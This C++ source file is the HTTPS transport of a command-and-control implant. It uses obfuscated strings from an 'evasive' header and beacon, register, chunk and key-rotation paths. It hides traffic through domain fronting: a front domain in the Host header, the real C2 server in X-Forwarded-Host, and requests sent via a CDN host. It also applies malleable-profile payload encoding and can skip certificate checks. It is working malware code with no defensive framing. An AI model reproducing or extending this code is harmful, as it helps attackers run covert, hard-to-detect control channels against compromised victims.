#include "FrontTransport.h"
#include "core/Transport.h"
#include "evasive/Strings.h"

#include <unordered_map>

namespace tx {

bool FrontTransport::send(std::string_view path, std::string_view body,
                          std::string_view agent_id, Reply& out) {
    std::unordered_map<std::string, std::string> hdrs;
    auto xa = OBF_KEEP("X-Agent");
    if (!agent_id.empty()) hdrs[xa.c_str()] = std::string(agent_id);

    auto p_reg = OBF_KEEP("/register");
    auto p_beacon = OBF_KEEP("/beacon");
    auto p_chunk = OBF_KEEP("/chunk");
    auto p_rk = OBF_KEEP("/rotate_key");
    auto p_check = OBF_KEEP("/check");

    const bool protocol_path =
        path == p_reg.c_str() || path == p_beacon.c_str() ||
        path == p_chunk.c_str() || path == p_rk.c_str();

    // Fronting headers always applied.
    if (!mp_.user_agent.empty()) hdrs["User-Agent"] = mp_.user_agent;
    hdrs["Host"] = front_domain_.empty() ? mp_.host : front_domain_;
    if (!real_c2_.empty()) hdrs["X-Forwarded-Host"] = real_c2_;

    std::string real_path(path);
    std::string enc(body);

    if (!protocol_path) {
        const malleable::Block* b = &mp_.http_post;
        if (path == p_check.c_str()) b = &mp_.http_get;
        for (const auto& [k, v] : b->headers) hdrs[k] = v;
        std::string param;
        enc = malleable::encode_payload(b->transforms, body, param);
        if (!b->uri.empty()) real_path = b->uri;
        if (!param.empty()) {
            real_path += (real_path.find('?') == std::string::npos ? "?" : "&");
            real_path += param + "=" + enc;
            enc.clear();
        }
    }

    auto r = transport::https_post(cdn_host_, port_, real_path, enc, hdrs, ignore_cert_);
    out.body = r.body;
    if (protocol_path && !r.ok && !r.body.empty() &&
        (r.status == 404 || r.status == 400 || r.status == 401)) {
        out.ok = true;
        return true;
    }
    out.ok = r.ok;
    return out.ok;
}

} // namespace tx
